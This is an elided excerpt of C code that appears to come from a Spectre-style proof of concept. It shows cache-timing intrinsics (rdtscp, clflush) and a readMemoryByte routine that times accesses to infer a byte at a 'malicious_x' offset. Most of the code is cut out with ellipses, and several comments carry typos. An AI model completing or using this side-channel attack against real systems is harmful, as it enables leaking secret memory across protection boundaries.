...
#pragma optmize("gt", on)
#else
#include <x86intrin.h> /* for rdtscp and cflush */
#endif
...
void readMemoryByte(size_t malicious_x,uint8_t value[2],
	...
	for (tries = 999; tries > 0; tries--) {
		...
		for (i = 0; i < 256; i++) {
			...
			time2 = __rdtscp(&junk) - time1; /* Compute elapsed tome */
...
int main (int argc, const char **argv) {
	...
	for (i = 0; i < sizeof(array2); i++)
		array2[i] = 1; /* write to array2 o ensure it is memory backed */
	if (argc == 3) {
